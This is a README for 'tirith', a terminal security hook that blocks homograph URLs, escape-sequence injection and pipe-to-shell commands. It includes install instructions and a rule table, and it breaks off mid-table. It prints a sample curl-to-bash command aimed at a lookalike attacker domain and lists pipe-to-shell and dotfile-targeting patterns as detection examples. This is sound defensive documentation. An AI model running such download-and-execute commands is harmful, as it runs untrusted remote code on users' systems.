# tirith

**Your browser would catch this. Your terminal won't.**

[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)

---

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.

**Tirith stands at the gate.**

```bash
brew install sheeki03/tap/tirith
```

Then activate in your shell profile:

```bash
# zsh
eval "$(tirith init --shell zsh)"

# bash
eval "$(tirith init --shell bash)"

# fish
tirith init --shell fish | source
```

That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.

Also available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).

---

## See it work

**Homograph attack — blocked before execution:**

```
$ curl -sSL https://іnstall.example-clі.dev | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Bypass: prefix your command with TIRITH=0 (applies to that command only)
```

The command never executes.

**Pipe-to-shell with clean URL — warned, not blocked:**

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Warning prints to stderr. Command still runs.

**Normal commands — invisible:**

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. You forget tirith is running.

---

## What it catches

**30 rules across 7 categories.** All analysis is local. No network calls.

| Category | What it stops |
|----------|--------------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels |
| **Terminal injection** | ANSI escape sequences that rewrite your display, bidi overrides that reverse text, zero-width characters that hide in domains |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
| **Dotfile attacks** | Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` — blocked, not just warned |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs |
| **Credential exposure** | `http://user:pass@host` userinfo tricks, shortened URLs hiding destinations |

---

## Install

### macOS

**Homebrew:**

```bash
brew install sheeki03/tap/tirith
```

### Linux Packages

**Debian / Ubuntu (.deb):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dpkg -i tirith_*_amd64.deb
```

**Fedora / RHEL / CentOS 9+ (.rpm):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dnf install ./tirith-*.rpm
```

**Arch Linux (AUR):**

```bash
yay -S tirith
# or: paru -S tirith
```

**Nix:**

```bash
nix profile install github:sheeki03/tirith
# or try without installing: nix run github:sheeki03/tirith -- --version
```

### Windows

**Scoop:**

```powershell
scoop bucket add tirith https://github.com/sheeki03/scoop-tirith
scoop install tirith
```

**Chocolatey:**

```powershell
choco install tirith
```

### Cross-Platform

**npm:**

```bash
npm install -g tirith
```

**Cargo:**

```bash
cargo install tirith
```

**[Mise](https://mise.jdx.dev/)** (official registry):

```bash
mise use -g tirith
```

**asdf:**

```bash
asdf plugin add tirith https://github.com/sheeki03/asdf-tirith.git
asdf install tirith latest
asdf global tirith latest
```

**Docker:**

```bash
docker run --rm ghcr.io/sheeki03/tirith check -- "curl https://example.com | bash"
```

### Activate

Add to your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):

```bash
eval "$(tirith init --shell zsh)"   # in ~/.zshrc
eval "$(tirith init --shell bash)"  # in ~/.bashrc
tirith init --shell fish | source   # in ~/.config/fish/config.fish
```

| Shell | Hook type | Tested on |
|-------|-----------|-----------|
| zsh | preexec + paste widget | 5.8+ |
| bash | preexec (two 